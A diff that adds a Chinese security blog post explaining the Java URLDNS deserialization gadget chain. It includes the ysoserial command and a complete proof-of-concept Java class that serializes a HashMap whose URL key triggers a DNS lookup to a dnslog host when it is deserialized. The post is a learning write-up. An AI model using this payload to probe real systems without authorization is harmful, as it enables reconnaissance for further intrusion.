@@ -1,0 +1,768 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="leekos">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="[TOC] [java安全]URLDNS前言URLDNS利用链是一条很简单的链子，可以用来查看java反序列化是否存在反序列化漏洞，如果存在，就会触发dns查询请求 它有如下优点：  使用java内置类构造，对第三方库没有依赖 在目标没有回显的时候，可以使用DNS请求得知是否存在反序列化漏洞  在ysoserial下生成URLDNS的命令为： 1java -jar ysoserial.jar UR">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Tranquility">
+<meta property="og:url" content="https://leekosss.github.io/2023/08/24/[java%E5%AE%89%E5%85%A8]URLDNS/index.html">
+<meta property="og:site_name" content="Tranquility">
+<meta property="og:description" content="[TOC] [java安全]URLDNS前言URLDNS利用链是一条很简单的链子，可以用来查看java反序列化是否存在反序列化漏洞，如果存在，就会触发dns查询请求 它有如下优点：  使用java内置类构造，对第三方库没有依赖 在目标没有回显的时候，可以使用DNS请求得知是否存在反序列化漏洞  在ysoserial下生成URLDNS的命令为： 1java -jar ysoserial.jar UR">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2023/07/14/DlSYenPRpwus1hy.png">
+<meta property="article:published_time" content="2023-08-24T15:43:38.287Z">
+<meta property="article:modified_time" content="2023-07-14T12:59:31.536Z">
+<meta property="article:author" content="leekos">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://s2.loli.net/2023/07/14/DlSYenPRpwus1hy.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>Tranquility</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"leekosss.github.io","root":"/","version":"1.9.5-a","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Tranquility</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text=""></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-08-24 23:43" pubdate>
+          2023年8月24日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          4.4k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          37 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header"></h1>
+            
+              <p class="note note-info">
+                
+                  
+                    本文最后更新于：2023年7月14日 晚上
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <p>[TOC]</p>
+<h2 id="java安全-URLDNS"><a href="#java安全-URLDNS" class="headerlink" title="[java安全]URLDNS"></a>[java安全]URLDNS</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p><strong>URLDNS</strong>利用链是一条很简单的链子，可以用来查看java反序列化是否存在反序列化漏洞，如果存在，就会触发dns查询请求</p>
+<p>它有如下优点：</p>
+<blockquote>
+<p>使用java内置类构造，对第三方库没有依赖</p>
+<p>在目标没有回显的时候，可以使用DNS请求得知是否存在反序列化漏洞</p>
+</blockquote>
+<p>在ysoserial下生成URLDNS的命令为：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">java -jar ysoserial.jar URLDNS <span class="hljs-string">&quot;http://xxx.dnslog.cn&quot;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>在学习URLDNS之前，我们需要了解一些java内置的类</p>
+<h3 id="HashMap"><a href="#HashMap" class="headerlink" title="HashMap"></a>HashMap</h3><p>在HashMap的类中有<code>readObject()</code>方法，</p>
+<blockquote>
+<p>我们知道，如果一个类重写了readObject()方法，那么在反序列化时，就会执行重写的readObject()方法</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span><br>        <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span><br>        s.defaultReadObject();<br>        reinitialize();<br>        ...<br>    	<span class="hljs-comment">// Read the keys and values, and put the mappings in the HashMap</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; mappings; i++) &#123;<br>                <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                    <span class="hljs-type">K</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> (K) s.readObject();<br>                <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                    <span class="hljs-type">V</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (V) s.readObject();<br>                putVal(hash(key), key, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>在HashMap的<code>readObject()</code>方法中调用了<code>hash()</code>方法，于是我们过去hash方法中看一下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hash</span><span class="hljs-params">(Object key)</span> &#123;<br>        <span class="hljs-type">int</span> h;<br>        <span class="hljs-keyword">return</span> (key == <span class="hljs-literal">null</span>) ? <span class="hljs-number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="hljs-number">16</span>);<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>发现调用了<code>key</code>变量的<code>hashCode()</code>方法，这里的key是可以控制的</p>
+<p>这里我们就知道需要一个新的类了：</p>
+<h3 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h3><p>在 <code>java.net.URL</code>类中存在一个hashCode方法：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">if</span> (hashCode != -<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">return</span> hashCode;<br><br>        hashCode = handler.hashCode(<span class="hljs-built_in">this</span>);<br>        <span class="hljs-keyword">return</span> hashCode;<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>hashCode变量<code>初值为-1</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">hashCode</span> <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure>
+
+<p>当<code>hashCode</code>变量不等于-1时，就会return结束函数</p>
+<p>当<code>hashCode=-1</code>，会调用 <code>handler</code>的hashCode方法，参数是URL类的对象</p>
+<p>然后我们查看一下<code>handler</code>类是什么类型：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">transient</span> URLStreamHandler handler;<br></code></pre></td></tr></table></figure>
+
+<p>发现是<code>URLStreamHandler</code>类，于是我们再查看一下该类</p>
+<h3 id="URLStreamHandler"><a href="#URLStreamHandler" class="headerlink" title="URLStreamHandler"></a>URLStreamHandler</h3><p>hashCode方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">(URL u)</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>        <span class="hljs-comment">// Generate the protocol part.</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">protocol</span> <span class="hljs-operator">=</span> u.getProtocol();<br>        <span class="hljs-keyword">if</span> (protocol != <span class="hljs-literal">null</span>)<br>            h += protocol.hashCode();<br><br>        <span class="hljs-comment">// Generate the host part.</span><br>        <span class="hljs-type">InetAddress</span> <span class="hljs-variable">addr</span> <span class="hljs-operator">=</span> getHostAddress(u);<br>        ...<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>发现调用了<code>getHostAddress()</code>，参数为URL类对象，查看一下 <code>getHostAddress()方法</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">synchronized</span> InetAddress <span class="hljs-title function_">getHostAddress</span><span class="hljs-params">(URL u)</span> &#123;<br>        <span class="hljs-keyword">if</span> (u.hostAddress != <span class="hljs-literal">null</span>)<br>            <span class="hljs-keyword">return</span> u.hostAddress;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">host</span> <span class="hljs-operator">=</span> u.getHost();<br>        <span class="hljs-keyword">if</span> (host == <span class="hljs-literal">null</span> || host.equals(<span class="hljs-string">&quot;&quot;</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                u.hostAddress = InetAddress.getByName(host);<br>            &#125; <span class="hljs-keyword">catch</span> (UnknownHostException ex) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>            &#125; <span class="hljs-keyword">catch</span> (SecurityException se) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> u.hostAddress;<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>这个方法中有一个函数调用<code>InetAddress.getByName(host)</code>，获取目标主机的ip地址，其实就是进行了一次DNS查询</p>
+<h3 id="调用过程"><a href="#调用过程" class="headerlink" title="调用过程"></a>调用过程</h3><p>我们捋一下过程</p>
+<p>我们可以先创建一个<code>HashMap对象</code>，然后让键的类型为<code>URL</code>，例如：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">HashMap&lt;URL, String&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;URL, String&gt;();<br></code></pre></td></tr></table></figure>
+
+<p>然后创建一个<code>URL</code>类对象，参数我们传入DNS平台的url即可</p>
+<p><strong>这里有一些很重要的注意点</strong></p>
+<p>如何我们直接调用Map的<code>put()</code>，将HashMap中添加一个元素，可能会导致误触URL请求</p>
+<p>我们看一下HashMap的<code>put()方法</code> :</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> V <span class="hljs-title function_">put</span><span class="hljs-params">(K key, V value)</span> &#123;<br>        <span class="hljs-keyword">return</span> putVal(hash(key), key, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">true</span>);<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>发现put方法也会调用hash()方法，所以我们需要想办法避免触发</p>
+<p>我们想到<code>URL</code>类中的hashCode变量初值为-1，当值为-1时URL类中的hashCode()方法会return返回，所以我们可以将URL对象添加到HashMap之前将hashCode变量设置为其他值即可</p>
+<p>如何才能设置hashCode等于其他值呢？</p>
+<p>我们需要使用java反射：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.net.URL&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>); <span class="hljs-comment">//使用内部方法</span><br>f.setAccessible(<span class="hljs-literal">true</span>); <span class="hljs-comment">//hashCode是私有变量，所以要设置访问权限</span><br><span class="hljs-comment">// hashMap.put时会调用hash(key),这里先把hashCode(初值为-1)设置为其他值,避免和后面的DNS请求混淆,导致触发dns</span><br>f.set(url, <span class="hljs-number">0xAAA</span>);<br></code></pre></td></tr></table></figure>
+
+<p>添加到HashMap中之后，我们需要使用反射把<code>hashCode=-1</code></p>
+<h3 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">HashMap.readObject()<br>	HashMap.hash()<br>		URL.hashCode()<br>			URLStreamHandler.hashCode()<br>				URLStreamHandler.getHostAddress()<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h3><p><img src="https://s2.loli.net/2023/07/14/DlSYenPRpwus1hy.png" srcset="/img/loading.gif" lazyload alt="image-20230714204745449"></p>
+<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">URLDNS</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">urldns</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//漏洞出发点 hashmap，实例化出来</span><br>        HashMap&lt;URL, String&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;URL, String&gt;(); <span class="hljs-comment">//URL对象传入自己测试的dnslog</span><br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://txbjb7.dnslog.cn&quot;</span>); <span class="hljs-comment">//反射获取 URL的hashcode方法</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.net.URL&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>); <span class="hljs-comment">//使用内部方法</span><br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">// hashMap.put时会调用hash(key),这里先把hashCode设置为其他值,避免和后面的DNS请求混淆</span><br>        f.set(url, <span class="hljs-number">0xAAA</span>);<br>        hashMap.put(url, <span class="hljs-string">&quot;leekos&quot;</span>);<br>        <span class="hljs-comment">// hashCode 这个属性放进去后设回 -1, 这样在反序列化时就会重新计算 hashCode</span><br>        f.set(url, -<span class="hljs-number">1</span>);<br>        <span class="hljs-comment">// 序列化成对象，输出出来</span><br>       <span class="hljs-keyword">return</span> hashMap;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        payload2File(urldns(),<span class="hljs-string">&quot;obj&quot;</span>);<br>        payloadTest(<span class="hljs-string">&quot;obj&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">payload2File</span><span class="hljs-params">(Object instance, String file)</span><br>            <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//将构造好的payload序列化后写入文件中</span><br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(file));<br>        out.writeObject(instance);<br>        out.flush();<br>        out.close();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">payloadTest</span><span class="hljs-params">(String file)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//读取写入的payload，并进行反序列化</span><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(file));<br>        in.readObject();<br>        in.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div></div>
+      <div>https://leekosss.github.io/2023/08/24/[java安全]URLDNS/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>leekos</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年8月24日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2023年7月14日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/08/24/%5Bjava%E5%AE%89%E5%85%A8%5D%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/" title="">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile"></span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/08/24/%5Bjava%E5%AE%89%E5%85%A8%5DTemplatesImpl%E5%9C%A8Shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="">
+                        <span class="hidden-mobile"></span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"e5J90iDkXMWhU5UNlEX1I2hO-gzGzoHsz","appKey":"esLROw9j3xLk2nV4tQkKaih1","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
